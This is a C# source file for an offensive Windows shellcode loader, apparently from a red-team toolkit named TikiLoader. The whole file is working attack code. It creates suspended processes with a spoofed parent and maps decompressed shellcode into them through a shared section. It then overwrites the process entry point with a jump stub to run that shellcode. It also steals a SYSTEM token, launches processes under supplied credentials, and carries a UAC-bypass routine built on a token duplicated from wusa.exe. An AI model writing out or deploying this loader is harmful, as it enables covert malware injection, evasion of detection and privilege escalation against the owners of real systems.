using System;
using System.IO;
using System.Diagnostics;
using System.IO.Compression;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static TikiLoader.Structs;
using static TikiLoader.Imports;
using static TikiLoader.Enums;

namespace TikiLoader
{
    public sealed class Loader
    {

        public const uint PageReadWriteExecute = 0x40;
        public const uint PageReadWrite = 0x04;
        public const uint PageExecuteRead = 0x20;
        public const uint MemCommit = 0x00001000;
        public const uint SecCommit = 0x08000000;
        public const uint GenericAll = 0x10000000;
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        IntPtr section_;
        IntPtr localmap_;
        IntPtr remotemap_;
        IntPtr localsize_;
        IntPtr remotesize_;
        IntPtr pModBase_;
        IntPtr pEntry_;
        uint rvaEntryOffset_;
        uint size_;
        byte[] inner_;

        public uint round_to_page(uint size)
        {
            SYSTEM_INFO info = new SYSTEM_INFO();

            GetSystemInfo(ref info);

            return (info.dwPageSize - size % info.dwPageSize) + size;
        }

        const int AttributeSize = 24;

        private bool nt_success(long v)
        {
            return (v >= 0);
        }

        public IntPtr GetCurrent()
        {
            return GetCurrentProcess();
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)size_;

            var status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);

            if (!nt_success(status))
                throw new SystemException("[x] Something went wrong! " + status);

            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        public static byte[] DecompressShellcode(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        public bool CreateSection(uint size)
        {
            LARGE_INTEGER liVal = new LARGE_INTEGER();
            size_ = round_to_page(size);
            liVal.LowPart = size_;

            var status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);

            return nt_success(status);
        }

        public void SetLocalSection(uint size)
        {
            var vals = MapSection(GetCurrent(), PageReadWrite, IntPtr.Zero);
            if (vals.Key == (IntPtr)0)
                throw new SystemException("[x] Failed to map view of section!");

            localmap_ = vals.Key;
            localsize_ = vals.Value;
        }

        public void CopyShellcode(byte[] buf)
        {
            var lsize = size_;
            if (buf.Length > lsize)
                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");

            unsafe
            {
                byte* p = (byte*)localmap_;

                for (int i = 0; i < buf.Length; i++)
                {
                    p[i] = buf[i];
                }
            }
        }

        public PROCESS_INFORMATION StartProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            IntPtr lpValue = IntPtr.Zero;

            try
            {

                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow | EXTENDED_STARTUPINFO_PRESENT;

                IntPtr lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(sInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                if (!CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo))
                    throw new SystemException("[x] Failed to create process!");

                return pInfo;

            }
            finally
            {
                DeleteProcThreadAttributeList(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(sInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
        }

        public PROCESS_INFORMATION StartProcessAs(string path, string domain, string username, string password)
        {
            STARTUPINFO startInfo = new STARTUPINFO();
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();

            uint flags = CreateSuspended | CreateNoWindow;

            if (!CreateProcessWithLogonW(username, domain, password, 0x00000001, path, "", flags, (UInt32)0, "C:\\Windows\\System32", ref startInfo, out procInfo))
                throw new SystemException("[x] Failed to create process!");

            return procInfo;
        }

        public PROCESS_INFORMATION StartElevatedProcess(string binary, [Optional]int elevatedPID)
        {
            IntPtr hProcess = IntPtr.Zero;

            if (elevatedPID > 0)
            {
                hProcess = OpenProcess(0x00001000, false, elevatedPID);
            }
            else
            {
                SHELLEXECUTEINFO shellInfo = new SHELLEXECUTEINFO();

                shellInfo.cbSize = Marshal.SizeOf(shellInfo);
                shellInfo.fMask = 0x40;
                shellInfo.lpFile = "wusa.exe";
                shellInfo.nShow = 0x0;

                if (!ShellExecuteEx(ref shellInfo))
                    throw new SystemException("[x] Failed to create process");

                hProcess = shellInfo.hProcess;
            }

            if (hProcess == IntPtr.Zero)
                throw new SystemException("[x] Failed to process handle");

            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, 0x02000000, ref hToken))
                throw new SystemException("[x] Failed to open process token");

            IntPtr hNewToken = IntPtr.Zero;
            SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();

            if (!DuplicateTokenEx(hToken, 0xf01ff, ref secAttribs, 2, 1, ref hNewToken))
                throw new SystemException("[x] Failed to duplicate process token");

            SID_IDENTIFIER_AUTHORITY sia = new SID_IDENTIFIER_AUTHORITY();
            sia.Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 };

            IntPtr pSID = IntPtr.Zero;
            if (!AllocateAndInitializeSid(ref sia, 1, 0x2000, 0, 0, 0, 0, 0, 0, 0, ref pSID))
                throw new SystemException("[x] Failed to initialize SID");

            SID_AND_ATTRIBUTES saa = new SID_AND_ATTRIBUTES();
            saa.Sid = pSID;
            saa.Attributes = 0x20;

            TOKEN_MANDATORY_LABEL tml = new TOKEN_MANDATORY_LABEL();
            tml.Label = saa;
            int tmlSize = Marshal.SizeOf(tml);
            if (NtSetInformationToken(hNewToken, 25, ref tml, tmlSize) != 0)
                throw new SystemException("[x] Failed to modify token");

            IntPtr luaToken = IntPtr.Zero;
            if (NtFilterToken(hNewToken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref luaToken) != 0)
                throw new SystemException("[x] Failed to create restricted token");

            hNewToken = IntPtr.Zero;
            secAttribs = new SECURITY_ATTRIBUTES();

            if (!DuplicateTokenEx(luaToken, 0xc, ref secAttribs, 2, 2, ref hNewToken))
                throw new SystemException("[x] Failed to duplicate restricted token");

            if (!ImpersonateLoggedOnUser(hNewToken))
                throw new SystemException("[x] Failed to impersonate context");

            STARTUPINFO sInfo = new STARTUPINFO();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            CreateProcessWithLogonW("xxx", "xxx", "xxx", LogonFlags.LOGON_NETCREDENTIALS_ONLY, binary, "",
                CreationFlags.CREATE_SUSPENDED, 0, @"C:\\Windows\\System32", ref sInfo, out pInfo);

            if (elevatedPID == 0)
                if (!TerminateProcess(hProcess, 1))
                    Console.WriteLine("Warning, failed to terminate wusa.exe");

            return pInfo;

        }

        public PROCESS_INFORMATION StartProcessAsSystem(string binary, int duplicatePid)
        {
            IntPtr hProcess = OpenProcess(0x00001000, false, duplicatePid);

            IntPtr hToken = IntPtr.Zero;
            OpenProcessToken(hProcess, 0x02000000, ref hToken);

            IntPtr hNewToken = IntPtr.Zero;
            SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();
            DuplicateTokenEx(hToken, 0xf01ff, ref secAttribs, 2, 1, ref hNewToken);

            STARTUPINFO sInfo = new STARTUPINFO();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            CreateProcessAsUser(hNewToken, binary, "", ref pSec, ref tSec, false, CreationFlags.CREATE_SUSPENDED, IntPtr.Zero, @"C:\Windows\System32", ref sInfo, out pInfo);

            return pInfo;
        }

        const ulong PatchSize = 0x10;

        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr;

            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);

            unsafe
            {

                var p = (byte*)ptr;
                byte[] tmp = null;

                if (IntPtr.Size == 4)
                {
                    p[i] = 0xb8;
                    i++;
                    var val = (Int32)dest;
                    tmp = BitConverter.GetBytes(val);
                }
                else
                {
                    p[i] = 0x48;
                    i++;
                    p[i] = 0xb8;
                    i++;

                    var val = (Int64)dest;
                    tmp = BitConverter.GetBytes(val);
                }

                for (int j = 0; j < IntPtr.Size; j++)
                    p[i + j] = tmp[j];

                i += IntPtr.Size;
                p[i] = 0xff;
                i++;
                p[i] = 0xe0;
                i++;
            }

            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            unsafe
            {
                fixed (byte* p = buf)
                {
                    uint e_lfanew_offset = *((uint*)(p + 0x3c));

                    byte* nthdr = (p + e_lfanew_offset);

                    byte* opthdr = (nthdr + 0x18);

                    ushort t = *((ushort*)opthdr);

                    byte* entry_ptr = (opthdr + 0x10);

                    var tmp = *((int*)entry_ptr);

                    rvaEntryOffset_ = (uint)tmp;

                    if (IntPtr.Size == 4)
                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
                    else
                        res = (IntPtr)(pModBase_.ToInt64() + tmp);

                }
            }

            pEntry_ = res;
            return res;
        }

        public IntPtr FindEntry(IntPtr hProc)
        {
            var basicInfo = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;

            var success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            if (!nt_success(success))
                throw new SystemException("[x] Failed to get process information!");

            IntPtr readLoc = IntPtr.Zero;
            var addrBuf = new byte[IntPtr.Size];
            if (IntPtr.Size == 4)
            {
                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
            }

            IntPtr nRead = IntPtr.Zero;

            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read process memory!");

            if (IntPtr.Size == 4)
                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
            else
                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            pModBase_ = readLoc;
            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
                throw new SystemException("[x] Failed to read module start!");

            return GetEntryFromBuffer(inner_);
        }

        public void MapAndStart(PROCESS_INFORMATION pInfo)
        {

            var tmp = MapSection(pInfo.hProcess, PageExecuteRead, IntPtr.Zero);
            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
                throw new SystemException("[x] Failed to map section into target process!");

            remotemap_ = tmp.Key;
            remotesize_ = tmp.Value;

            var patch = BuildEntryPatch(tmp.Key);

            try
            {

                var pSize = (IntPtr)patch.Key;
                IntPtr tPtr = new IntPtr();

                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
                    throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
            }
            finally
            {
                if (patch.Value != IntPtr.Zero)
                    Marshal.FreeHGlobal(patch.Value);
            }

            var tbuf = new byte[0x1000];
            var nRead = new IntPtr();
            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
                throw new SystemException("Failed!");

            var res = ResumeThread(pInfo.hThread);
            if (res == unchecked((uint)-1))
                throw new SystemException("[x] Failed to restart thread!");

        }

        public IntPtr GetBuffer()
        {
            return localmap_;
        }
        ~Loader()
        {
            if (localmap_ != (IntPtr)0)
                ZwUnmapViewOfSection(section_, localmap_);

        }

        public void Load(string binary, byte[] shellcode, int ppid)
        {

            var pinf = StartProcess(binary, ppid);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        public void LoadAs(string binary, byte[] shellcode, string domain, string username, string password)
        {

            var pinf = StartProcessAs(binary, domain, username, password);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);

            CopyShellcode(shellcode);

            MapAndStart(pinf);

            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        public void LoadAsSystem(string binary, byte[] shellcode, int impersonationPid)
        {
            var pinf = StartProcessAsSystem(binary, impersonationPid);
            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);
        }

        public void LoadElevated(string binary, byte[] shellcode, int elevatedPid)
        {

            var pinf = StartElevatedProcess(binary, elevatedPid);

            FindEntry(pinf.hProcess);

            if (!CreateSection((uint)shellcode.Length))
                throw new SystemException("[x] Failed to create new section!");

            SetLocalSection((uint)shellcode.Length);
            CopyShellcode(shellcode);
            MapAndStart(pinf);
            CloseHandle(pinf.hThread);
            CloseHandle(pinf.hProcess);

        }

        public Loader()
        {
            section_ = new IntPtr();
            localmap_ = new IntPtr();
            remotemap_ = new IntPtr();
            localsize_ = new IntPtr();
            remotesize_ = new IntPtr();
            inner_ = new byte[0x1000];
        }

    }
}